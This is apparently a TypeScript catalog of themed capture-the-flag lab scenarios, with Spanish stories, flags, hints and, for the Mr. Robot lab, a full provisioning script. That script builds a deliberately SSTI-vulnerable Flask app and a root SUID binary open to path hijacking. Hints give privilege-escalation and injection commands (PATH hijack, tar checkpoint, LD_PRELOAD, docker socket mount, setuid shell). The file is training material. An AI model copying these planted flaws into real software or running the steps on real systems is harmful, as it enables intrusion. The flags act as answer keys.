import { CTFScenario } from '../types';

export const DEFAULT_SCENARIOS_CATALOG: CTFScenario[] = [
  {
    codename: 'FSOCIETY_E_CORP_01',
    themeName: 'Mr. Robot - Evil Corp E-Coin Banking Terminal',
    genre: 'tv_series',
    difficulty: 'Medium',
    vector: 'SSTI (Server-Side Template Injection) en Jinja2/Flask',
    secondaryVector: 'Escalada de privilegios mediante binario SUID con secuestro de ruta (Path Hijacking)',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.42',
    story: `Llegó el 9 de mayo. Evil Corp ha desplegado un portal de emergencia para la validación y canje de transacciones corporativas en E-Coin. Elliot y Fsociety detectaron que el portal web concatena directamente las peticiones del titular de la cuenta en el motor de plantillas Jinja2 sin sanitización previa.`,
    userFlag: 'CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}',
    rootFlag: 'CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}',
    userFlagPath: '/home/elliot/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      {
        id: 'mr-h1',
        level: 1,
        title: 'Inspección de Parámetros Reflejados',
        category: 'recon',
        text: 'Observa detenidamente qué sucede con el parámetro enviado en la URL (?account=...). ¿El servidor sanitiza las etiquetas o interpreta los datos de forma dinámica?',
      },
      {
        id: 'mr-h2',
        level: 2,
        title: 'Verificación del Motor de Plantillas en Python',
        category: 'foothold',
        text: 'El servicio está construido con Flask y Jinja2. Prueba inyectar expresiones aritméticas entre llaves dobles como {{ 7 * 7 }}. Si el servidor devuelve 49, se confirma SSTI.',
      },
      {
        id: 'mr-h3',
        level: 3,
        title: 'Introspección MRO para RCE',
        category: 'foothold',
        text: 'Jinja2 permite acceder a clases base de Python mediante ()__class__.__mro__. Usa os.popen para ejecutar "cat /home/elliot/user.txt" y extraer la bandera de usuario.',
      },
      {
        id: 'mr-h4',
        level: 1,
        title: 'Búsqueda de Privilegios Delegados',
        category: 'privesc',
        text: 'Una vez dentro como elliot, audita qué archivos en el sistema tienen el bit SUID activo perteneciente al usuario root.',
      },
      {
        id: 'mr-h5',
        level: 2,
        title: 'Inspección de /usr/local/bin/system-diag',
        category: 'privesc',
        text: 'Usa "find / -perm -u=s -type f 2>/dev/null" y revisa las cadenas del ejecutable system-diag con strings. Llama a un binario externo sin ruta absoluta.',
      },
      {
        id: 'mr-h6',
        level: 3,
        title: 'Explotación de Path Hijacking',
        category: 'privesc',
        text: 'Crea un ejecutable llamado "service-checker" en /tmp que invoque /bin/bash -p, agrégalo a tu PATH ("export PATH=/tmp:$PATH") y ejecuta /usr/local/bin/system-diag para obtener root.',
      },
    ],
    // Nota: solo se publica el puerto 80 porque es el único servicio que
    // realmente instala y arranca el provisionamiento de abajo (Flask).
    // No se exponen 22/445: ni sshd ni Samba se instalan en esta imagen.
    openPorts: [
      { port: 80, service: 'HTTP', version: 'Gunicorn/Flask + Nginx 1.24', purpose: 'Portal de transacciones E-Coin (Vulnerable a SSTI)' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Estudiante / Auditor de Seguridad' },
        { id: 'gateway', label: 'Gateway DMZ (10.10.110.1)', type: 'gateway', role: 'Segmentación perimetral de red' },
        { id: 'target', label: 'FSOCIETY_E_CORP_01 (10.10.110.42)', type: 'target', role: 'Servidor Web & SSH Objetivo' },
        { id: 'internal', label: 'Bóveda de Claves Privadas / Root', type: 'internal', role: 'Bandera Final /root/root.txt' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN WireGuard', desc: 'Acceso seguro al laboratorio' },
        { from: 'gateway', to: 'target', proto: 'TCP: 80', desc: 'Superficie de red expuesta' },
        { from: 'target', to: 'internal', proto: 'IPC / SUID PrivEsc', desc: 'Canal de escalada local' },
      ],
    },
    // provisionScript/dockerfile/dockerCompose alineados con el laboratorio
    // funcional real (ver App.tsx, INITIAL_SCENARIO): la versión anterior de
    // este preset nunca instalaba Flask ni arrancaba ningún servicio, pese a
    // anunciar un puerto 80 "vulnerable a SSTI".
    provisionScript: `#!/usr/bin/env bash
set -euo pipefail
echo "[*] Initializing NetPhantom CTF Environment: FSOCIETY_E_CORP_01"

apt-get update -y && apt-get install -y \\
    python3 python3-pip python3-venv \\
    gcc libc6-dev sudo curl net-tools \\
    procps supervisor

# Guarded: con "restart: unless-stopped", cualquier crash/reinicio de host
# vuelve a correr este script contra el rootfs persistido del contenedor,
# donde elliot ya existe del primer arranque - un useradd a pelo fallaba
# y, con set -euo pipefail, abortaba antes de que Flask llegase a arrancar.
id elliot &>/dev/null || useradd -m -s /bin/bash elliot
echo "elliot:Password123!" | chpasswd

mkdir -p /opt/vulnerable_app
cat << 'EOF' > /opt/vulnerable_app/app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)

TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Evil Corp E-Coin Validation Portal</title></head>
<body>
    <h2>[ EVIL CORP E-COIN LEDGER TERMINAL ]</h2>
    <p>Transacción enviada para: <strong>%s</strong></p>
</body>
</html>
"""

@app.route("/")
def index():
    account = request.args.get("account", "Invitado_Corporativo")
    # Vulnerabilidad didáctica deliberada de SSTI:
    rendered = TEMPLATE % account
    return render_template_string(rendered)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
EOF

python3 -m venv /opt/vulnerable_app/venv
/opt/vulnerable_app/venv/bin/pip install --no-cache-dir flask

echo "CTF{3v1l_c0rp_3c01n_t3mpl4t3_1nj3ct10n_pwn3d}" > /home/elliot/user.txt
chown elliot:elliot /home/elliot/user.txt
chmod 640 /home/elliot/user.txt

echo "CTF{d4rk_4rmy_wh1t3r053_m45t3r_k3y_unl0ck3d}" > /root/root.txt
chown root:root /root/root.txt
chmod 600 /root/root.txt

cat << 'EOF' > /tmp/status_tool.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    // Deliberate security flaw: relative path allows path hijacking
    system("service-checker --status");
    return 0;
}
EOF
gcc /tmp/status_tool.c -o /usr/local/bin/system-diag
chmod 4755 /usr/local/bin/system-diag
rm -f /tmp/status_tool.c

echo "[+] Lab provisioned successfully. Starting service on port 80..."
exec /opt/vulnerable_app/venv/bin/python /opt/vulnerable_app/app.py
`,
    dockerfile: `FROM debian:12-slim
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y \\
    python3 python3-pip python3-venv \\
    gcc libc6-dev sudo curl procps \\
    && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY provision.sh /app/provision.sh
RUN chmod +x /app/provision.sh
EXPOSE 80
CMD ["/app/provision.sh"]`,
    // No "RUN useradd elliot" arriba: provision.sh (CMD) ya lo crea y le
    // fija la contraseña. Un segundo useradd al arrancar el contenedor
    // fallaba con "user already exists", y set -euo pipefail abortaba el
    // script antes de instalar Flask o escribir las flags - el único
    // laboratorio "real" del catálogo offline nunca llegaba a arrancar.
    // Nota de seguridad: sin cap_drop/no-new-privileges aquí a propósito -
    // el reto depende de un binario SUID (system-diag) y de un
    // "apt-get install" en el arranque del contenedor; ver el comentario
    // gemelo en App.tsx (INITIAL_SCENARIO) para el detalle completo.
    dockerCompose: `version: '3.8'
services:
  ctf_target:
    build: .
    container_name: fsociety_e_corp_01
    hostname: fsociety_e_corp_01
    ports:
      - "127.0.0.1:8080:80"
    networks:
      ctf_isolated_net:
        ipv4_address: 10.10.110.42
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1024M
networks:
  ctf_isolated_net:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.110.0/24`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] NetPhantom CTF: FSOCIETY_E_CORP_01")\n`,
    walkthrough: `# Guía de Resolución: FSOCIETY_E_CORP_01\n1. SSTI en Jinja2\n2. Path Hijacking con SUID.`,
  },
  {
    codename: 'NEBUCHADNEZZAR_01',
    themeName: 'The Matrix - Nebuchadnezzar Core & Zion Relay',
    genre: 'scifi',
    difficulty: 'Hard',
    vector: 'Inyección de Comandos OS en Daemon de Sintonización de Emisiones',
    secondaryVector: 'Linux Capabilities (cap_setuid+ep en intérprete Python 3)',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.101',
    story: `La nave Nabucodonosor de Morfeo ejecuta una pasarela clandestina para transmitir señales piratas a la Matriz. Una interfaz de diagnóstico de radio expone una inyección de comandos que permite escapar de la simulación.`,
    userFlag: 'CTF{wh1t3_r4bb1t_f0ll0w_th3_c0d3_m4tr1x}',
    rootFlag: 'CTF{th3_0n3_n30_unplug_fr0m_m4tr1x_z10n}',
    userFlagPath: '/home/operator/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'mx-1', level: 1, title: 'Delimitadores Shell', category: 'recon', text: 'Analiza cómo la utilidad de diagnóstico procesa caracteres como punto y coma o pipes.' },
      { id: 'mx-2', level: 2, title: 'Inyección de Comandos', category: 'foothold', text: 'Encadena comandos con ; o && para ejecutar cat sobre el home del operador.' },
      { id: 'mx-3', level: 3, title: 'Evasión de Espacios', category: 'foothold', text: 'Usa ${IFS} si los espacios están filtrados en la solicitud HTTP.' },
      { id: 'mx-4', level: 1, title: 'Capacidades POSIX', category: 'privesc', text: 'Comprueba capacidades del kernel con getcap -r /.' },
      { id: 'mx-5', level: 2, title: 'cap_setuid en Python', category: 'privesc', text: 'El intérprete python3 cuenta con cap_setuid+ep.' },
      { id: 'mx-6', level: 3, title: 'Shell Root', category: 'privesc', text: 'Llama a os.setuid(0) desde python3 para abrir una shell como root.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso de consola' },
      { port: 8088, service: 'HTTP', version: 'Python Tornado', purpose: 'Daemon de frecuencias' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Operador / Red Team' },
        { id: 'gateway', label: 'Gateway Zion (10.10.110.1)', type: 'gateway', role: 'Filtro EMP' },
        { id: 'target', label: 'NEBUCHADNEZZAR_01', type: 'target', role: 'Núcleo de Transmisión' },
        { id: 'internal', label: 'Consola Principal /root', type: 'internal', role: 'Objetivo Zion' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN WireGuard', desc: 'Túnel cifrado' },
        { from: 'gateway', to: 'target', proto: 'TCP: 22, 8088', desc: 'Señal expuesta' },
        { from: 'target', to: 'internal', proto: 'Capabilities', desc: 'Escalada local' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Matrix Node Ready"\n`,
    dockerfile: `FROM debian:12-slim\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Matrix Scenario Builder")\n`,
    walkthrough: `# Solución Matrix\n1. Inyección de comandos.\n2. cap_setuid.`,
  },
  {
    codename: 'KAER_MORHEN_01',
    themeName: 'The Witcher - Kaer Morhen Alchemical Vault',
    genre: 'fantasy',
    difficulty: 'Easy',
    vector: 'LFI (Local File Inclusion) a RCE con Log Poisoning en PHP',
    secondaryVector: 'Sudo NOPASSWD en script de destilación alquímica',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.105',
    story: `El archivo secreto de la Escuela del Lobo guarda las fórmulas de la Prueba de las Hierbas. Vesemir descubrió que el catálogo rúnico en PHP admite inclusión arbitraria de pergaminos, permitiendo contaminar registros del servidor.`,
    userFlag: 'CTF{wh1t3_w0lf_tr14l_0f_gr45535_mut4g3n}',
    rootFlag: 'CTF{v353m1r_4nc13nt_w1tch3r_m45t3r_k3y}',
    userFlagPath: '/home/geralt/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'km-1', level: 1, title: 'Inclusión de Archivos', category: 'recon', text: 'Prueba traversales con ../ en el parámetro scroll.' },
      { id: 'km-2', level: 2, title: 'Lectura de Registros', category: 'foothold', text: 'Accede a /var/log/apache2/access.log.' },
      { id: 'km-3', level: 3, title: 'Log Poisoning', category: 'foothold', text: 'Inyecta código PHP en la cabecera User-Agent.' },
      { id: 'km-4', level: 1, title: 'Reglas de Sudo', category: 'privesc', text: 'Comprueba sudo -l.' },
      { id: 'km-5', level: 2, title: 'Script brew.sh', category: 'privesc', text: 'Revisa qué evalúa el script con permisos root.' },
      { id: 'km-6', level: 3, title: 'Inyección de Receta', category: 'privesc', text: 'Pasa un archivo con /bin/bash como argumento.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6', purpose: 'Acceso seguro' },
      { port: 80, service: 'HTTP', version: 'Apache 2.4.58 + PHP 8.3', purpose: 'Catálogo de mutágenos' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Auditor Brujo' },
        { id: 'gateway', label: 'Muralla de Kaer Morhen', type: 'gateway', role: 'Firewall' },
        { id: 'target', label: 'KAER_MORHEN_01', type: 'target', role: 'Servidor Alquímico' },
        { id: 'internal', label: 'Laboratorio de Mutágenos', type: 'internal', role: 'Bóveda Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Canal seguro' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Servicios expuestos' },
        { from: 'target', to: 'internal', proto: 'Sudo', desc: 'Escalada local' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Kaer Morhen Ready"\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Kaer Morhen Scenario")\n`,
    walkthrough: `# Solución Kaer Morhen\n1. LFI + Log Poisoning.\n2. Sudo brew.sh.`,
  },
  {
    codename: 'UMBRELLA_HIVE_01',
    themeName: 'Resident Evil - Umbrella Hive Sub-Level 6',
    genre: 'horror',
    difficulty: 'Easy',
    vector: 'SMB / Recursos Compartidos Obsoletos con Acceso Anónimo',
    secondaryVector: 'LD_PRELOAD Injection en ejecutable de presurización',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.108',
    story: `Los laboratorios subterráneos de Raccoon City están en cuarentena. La Reina Roja bloqueó las salidas, pero un recurso Samba desprotegido expone credenciales médicas.`,
    userFlag: 'CTF{r3d_qu33n_y0u_4r3_4ll_g01ng_t0_d13}',
    rootFlag: 'CTF{t_v1ru5_g_v1ru5_n3m3515_pr0t0c0l_r00t}',
    userFlagPath: '/home/alice/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 're-1', level: 1, title: 'Enumeración SMB', category: 'recon', text: 'Usa smbclient con opción -N en el puerto 445.' },
      { id: 're-2', level: 2, title: 'Recurso backup_decon', category: 'foothold', text: 'Descarga archivos .conf sin autenticación.' },
      { id: 're-3', level: 3, title: 'Clave SSH', category: 'foothold', text: 'Inicia sesión con las credenciales de Alice.' },
      { id: 're-4', level: 1, title: 'sudo env_keep', category: 'privesc', text: 'Observa la directiva env_keep += LD_PRELOAD.' },
      { id: 're-5', level: 2, title: 'Biblioteca Dinámica', category: 'privesc', text: 'Compila un .so con setuid(0) y system("/bin/bash").' },
      { id: 're-6', level: 3, title: 'Ejecución con LD_PRELOAD', category: 'privesc', text: 'Ejecuta sudo LD_PRELOAD=/tmp/root.so /usr/bin/decon-status.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso médico' },
      { port: 445, service: 'SMB', version: 'Samba 4.17.12', purpose: 'Almacén de desinfección' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Superviviente / STARS' },
        { id: 'gateway', label: 'Compuerta Láser Colmena', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'UMBRELLA_HIVE_01', type: 'target', role: 'Servidor Reina Roja' },
        { id: 'internal', label: 'Cámara Criogénica Némesis', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Infiltración' },
        { from: 'gateway', to: 'target', proto: 'SMB: 445, SSH: 22', desc: 'Red vulnerable' },
        { from: 'target', to: 'internal', proto: 'LD_PRELOAD', desc: 'Escalada local' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Umbrella Lab Provisioned"\n`,
    dockerfile: `FROM debian:12-slim\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Umbrella Scenario")\n`,
    walkthrough: `# Solución Resident Evil\n1. SMB anónimo.\n2. LD_PRELOAD.`,
  },
  {
    codename: 'TYRELL_NEXUS_01',
    themeName: 'Blade Runner - Tyrell Corporation Nexus Vault',
    genre: 'cyberpunk',
    difficulty: 'Insane',
    vector: 'Deserialización Insegura en API Python Pickle de Evaluación Replicante',
    secondaryVector: 'Socket de Docker expuesto al usuario (/var/run/docker.sock)',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.112',
    story: `Los servidores de genética Nexus en Los Ángeles 2019 procesan lecturas pupilares del test Voight-Kampff. Los datos biométricos se transmiten serializados en base64 con Pickle sin validación.`,
    userFlag: 'CTF{t34r5_1n_r41n_t1m3_t0_d13_r0y_b4tty}',
    rootFlag: 'CTF{m0r3_hum4n_th4n_hum4n_3ld0n_tyr3ll}',
    userFlagPath: '/home/deckard/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'br-1', level: 1, title: 'Payloads Base64', category: 'recon', text: 'Inspecciona la cabecera mágica de los datos en /api/v1/voight-kampff.' },
      { id: 'br-2', level: 2, title: 'Pickle en Python', category: 'foothold', text: 'El método __reduce__ se ejecuta al deserializar con pickle.loads.' },
      { id: 'br-3', level: 3, title: 'Exploit con Reverse Shell', category: 'foothold', text: 'Genera un payload Pickle con os.system enviando una reverse shell.' },
      { id: 'br-4', level: 1, title: 'Grupos Locales', category: 'privesc', text: 'Ejecuta id y verifica pertenencia al grupo docker.' },
      { id: 'br-5', level: 2, title: 'Socket de Docker', category: 'privesc', text: 'Acceso de escritura en /var/run/docker.sock equivale a root.' },
      { id: 'br-6', level: 3, title: 'Montaje de Host Filesystem', category: 'privesc', text: 'docker run -v /:/host -it debian chroot /host.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6', purpose: 'Acceso blade runner' },
      { port: 5000, service: 'HTTP', version: 'FastAPI / Gunicorn', purpose: 'API Voight-Kampff' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Blade Runner Rebelde' },
        { id: 'gateway', label: 'Pirámide Tyrell DMZ', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'TYRELL_NEXUS_01', type: 'target', role: 'API Replicante' },
        { id: 'internal', label: 'Bóveda Nexus 7', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Acceso' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 5000, SSH: 22', desc: 'Servicios' },
        { from: 'target', to: 'internal', proto: 'Docker Socket', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Tyrell Lab Ready"\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Tyrell Scenario")\n`,
    walkthrough: `# Solución Blade Runner\n1. Pickle deserialization.\n2. Docker socket escape.`,
  },
  {
    codename: 'WEYLAND_NOSTROMO_01',
    themeName: 'Alien - Weyland-Yutani Nostromo (MU-TH-UR 6000)',
    genre: 'scifi',
    difficulty: 'Medium',
    vector: 'SQL Injection Ciega en Endpoint de Monitoreo Criogénico',
    secondaryVector: 'Cronjob desatendido ejecutando script con comodín Tar (Wildcard Injection)',
    targetOS: 'Debian 12 Bookworm',
    ip: '10.10.110.115',
    story: `La computadora central MU-TH-UR 6000 de la nave Nostromo ejecuta la Orden Especial 937. Una inyección SQL en el panel de criogenia permite extraer credenciales de Ash.`,
    userFlag: 'CTF{w3yl4nd_yut4n1_0rd3r_937_cr3w_3xp3nd4bl3}',
    rootFlag: 'CTF{x3n0m0rph_p3rf3ct_0rg4n15m_4dm1n_4cc355}',
    userFlagPath: '/home/ripley/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'wy-1', level: 1, title: 'Parámetro pod_id', category: 'recon', text: 'Comprueba respuestas con pod_id=1 AND 1=1 frente a 1=2.' },
      { id: 'wy-2', level: 2, title: 'Inyección Booleana', category: 'foothold', text: 'Extrae caracteres con SUBSTRING en la tabla crew_members.' },
      { id: 'wy-3', level: 3, title: 'Automatización SQLMap', category: 'foothold', text: 'sqlmap -u "http://10.10.110.115/capsule?pod_id=1" --dump.' },
      { id: 'wy-4', level: 1, title: 'Cronjobs', category: 'privesc', text: 'Revisa /etc/crontab cada minuto ejecutando tar.' },
      { id: 'wy-5', level: 2, title: 'Comodín Asterisco', category: 'privesc', text: 'Tar interpreta archivos con nombres que empiezan por -- como argumentos.' },
      { id: 'wy-6', level: 3, title: 'Inyección de Checkpoint', category: 'privesc', text: 'Crea --checkpoint=1 y --checkpoint-action=exec=sh exploit.sh.' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.2p1', purpose: 'Acceso Ripley' },
      { port: 80, service: 'HTTP', version: 'Nginx 1.24', purpose: 'Panel MU-TH-UR' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Oficial de Vuelo' },
        { id: 'gateway', label: 'Interfaz Nostromo', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'WEYLAND_NOSTROMO_01', type: 'target', role: 'Computadora Central' },
        { id: 'internal', label: 'Módulo de Navegación', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Enlace' },
        { from: 'gateway', to: 'target', proto: 'HTTP: 80, SSH: 22', desc: 'Puertos' },
        { from: 'target', to: 'internal', proto: 'Tar Wildcard', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Nostromo Ready"\n`,
    dockerfile: `FROM debian:12-slim\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Nostromo Scenario")\n`,
    walkthrough: `# Solución Nostromo\n1. Blind SQLi.\n2. Tar wildcard privesc.`,
  },
  {
    codename: 'MORDOR_RELAY_01',
    themeName: 'The Lord of the Rings - Barad-dûr Palantír Mesh',
    genre: 'fantasy',
    difficulty: 'Insane',
    vector: 'Tokens JWT Manipulados con Algoritmo "none" y Bypass de Firma',
    secondaryVector: 'Desbordamiento de Búfer (Buffer Overflow en binario SUID)',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.120',
    story: `La red de palantíri de Sauron sincroniza órdenes oscuras. La API de los Nazgûl valida tokens JWT pero acepta el algoritmo "none" sin requerir firma criptográfica.`,
    userFlag: 'CTF{0n3_r1ng_t0_rul3_th3m_4ll_1n_th3_d4rkn355}',
    rootFlag: 'CTF{54ur0n_3y3_5335_4ll_m0rd0r_r00t_m45t3r}',
    userFlagPath: '/home/frodo/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'md-1', level: 1, title: 'Cabeceras JWT', category: 'recon', text: 'Decodifica la cookie de sesión en jwt.io.' },
      { id: 'md-2', level: 2, title: 'Algoritmo none', category: 'foothold', text: 'Cambia "alg": "HS256" por "alg": "none" en la cabecera.' },
      { id: 'md-3', level: 3, title: 'Firma Vacía', category: 'foothold', text: 'Envía el token con header.payload. omitiendo la firma.' },
      { id: 'md-4', level: 1, title: 'Binario de la Forja', category: 'privesc', text: 'Examina /opt/forge/grond_hammer con bit SUID.' },
      { id: 'md-5', level: 2, title: 'strcpy Inseguro', category: 'privesc', text: 'El programa copia el argumento en un búfer de 64 bytes sin límite.' },
      { id: 'md-6', level: 3, title: 'Sobreescritura de Retorno', category: 'privesc', text: 'Sobrescribe RIP apuntando a la función oculta forge_master().' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.6', purpose: 'Acceso frodo' },
      { port: 8443, service: 'HTTP', version: 'Node.js Express', purpose: 'API Palantír' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Comunidad del Anillo' },
        { id: 'gateway', label: 'Puerta Negra de Mordor', type: 'gateway', role: 'Perímetro' },
        { id: 'target', label: 'MORDOR_RELAY_01', type: 'target', role: 'Torre Barad-dûr' },
        { id: 'internal', label: 'Ojo de Sauron /root', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Incursión' },
        { from: 'gateway', to: 'target', proto: 'TCP: 8443, 22', desc: 'Servicios' },
        { from: 'target', to: 'internal', proto: 'Buffer Overflow', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Mordor Relay Ready"\n`,
    dockerfile: `FROM ubuntu:24.04\nCMD ["/bin/bash"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Mordor Scenario")\n`,
    walkthrough: `# Solución Mordor\n1. JWT alg none.\n2. Buffer Overflow.`,
  },
  {
    codename: 'HAWKINS_GATE_01',
    themeName: 'Stranger Things - Hawkins National Lab Portal',
    genre: 'horror',
    difficulty: 'Medium',
    vector: 'SMB / Recursos Compartidos con Acceso Anónimo a Backups',
    secondaryVector: 'Linux Capabilities (cap_setuid en python3)',
    targetOS: 'Alpine Linux 3.20 (Minimal)',
    ip: '10.10.110.130',
    story: `El Departamento de Energía de Hawkins mantiene una estación de telemetría del Mundo del Revés. Una carpeta Samba compartida sin autenticación expone copias de seguridad de las grabaciones del Dr. Brenner.`,
    userFlag: 'CTF{h4wk1n5_l4b_up51d3_d0wn_p0rt4l}',
    rootFlag: 'CTF{3l3v3n_w4ffl35_m1ndfl4y3r_r00t_k3y}',
    userFlagPath: '/home/hopper/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'st-1', level: 1, title: 'Compartición de Red', category: 'recon', text: 'Comprueba el puerto 445 de Samba.' },
      { id: 'st-2', level: 2, title: 'Backups Anónimos', category: 'foothold', text: 'Descarga grabaciones con smbclient -N.' },
      { id: 'st-3', level: 3, title: 'Llave id_rsa', category: 'foothold', text: 'Usa la clave privada de Hopper para entrar por SSH.' },
      { id: 'st-4', level: 1, title: 'Capacidades', category: 'privesc', text: 'Revisa getcap -r /.' },
      { id: 'st-5', level: 2, title: 'Python cap_setuid', category: 'privesc', text: 'Python puede cambiar UID sin ser SUID.' },
      { id: 'st-6', level: 3, title: 'Escalada', category: 'privesc', text: 'python3 -c "import os; os.setuid(0); os.execl(\'/bin/sh\', \'sh\')".' },
    ],
    openPorts: [
      { port: 22, service: 'SSH', version: 'OpenSSH 9.7', purpose: 'Acceso Hopper' },
      { port: 445, service: 'SMB', version: 'Samba 4.19', purpose: 'Backups experimentos' },
    ],
    topology: {
      nodes: [
        { id: 'attacker', label: 'Kali Linux (10.10.14.5)', type: 'attacker', role: 'Investigador' },
        { id: 'gateway', label: 'Perímetro Militar Hawkins', type: 'gateway', role: 'Control' },
        { id: 'target', label: 'HAWKINS_GATE_01', type: 'target', role: 'Estación de Telemetría' },
        { id: 'internal', label: 'Portal Mundo del Revés', type: 'internal', role: 'Objetivo Root' },
      ],
      links: [
        { from: 'attacker', to: 'gateway', proto: 'VPN', desc: 'Acceso' },
        { from: 'gateway', to: 'target', proto: 'SMB: 445, SSH: 22', desc: 'Red' },
        { from: 'target', to: 'internal', proto: 'Capabilities', desc: 'Escalada' },
      ],
    },
    provisionScript: `#!/usr/bin/env bash\necho "[*] Hawkins Ready"\n`,
    dockerfile: `FROM alpine:3.20\nCMD ["/bin/sh"]\n`,
    dockerCompose: `version: '3.8'\nservices:\n  ctf_target:\n    build: .\n`,
    pythonScript: `#!/usr/bin/env python3\nprint("[*] Hawkins Scenario")\n`,
    walkthrough: `# Solución Hawkins\n1. Samba backup.\n2. cap_setuid python3.`,
  },
  {
    codename: 'ARASAKA_ICE_BREAK_01',
    themeName: 'Cyberpunk: Edgerunners - Arasaka Tower Sub-Level 4',
    genre: 'cyberpunk',
    difficulty: 'Hard',
    vector: 'Deserialización Insegura en API de Telemetría de Ciberimplantes',
    secondaryVector: 'LD_PRELOAD Injection en ejecutable de seguridad',
    targetOS: 'Ubuntu 24.04 LTS',
    ip: '10.10.110.140',
    story: `En Night City, la Torre Arasaka monitoriza implantes Sandevistan. Una API interna de diagnóstico deserializa objetos de telemetría sin validar su integridad.`,
    userFlag: 'CTF{n1ght_c1ty_54nd3v15t4n_pwn3d}',
    rootFlag: 'CTF{m1k05h1_50ulk1ll3r_r00t_4cc355}',
    userFlagPath: '/home/david/user.txt',
    rootFlagPath: '/root/root.txt',
    hints: [
      { id: 'cp-1', level: 1, title: 'Tráfico de Ciberware', category: 'recon', text: 'Analiza peticiones en /api/telemetry/sync.' },
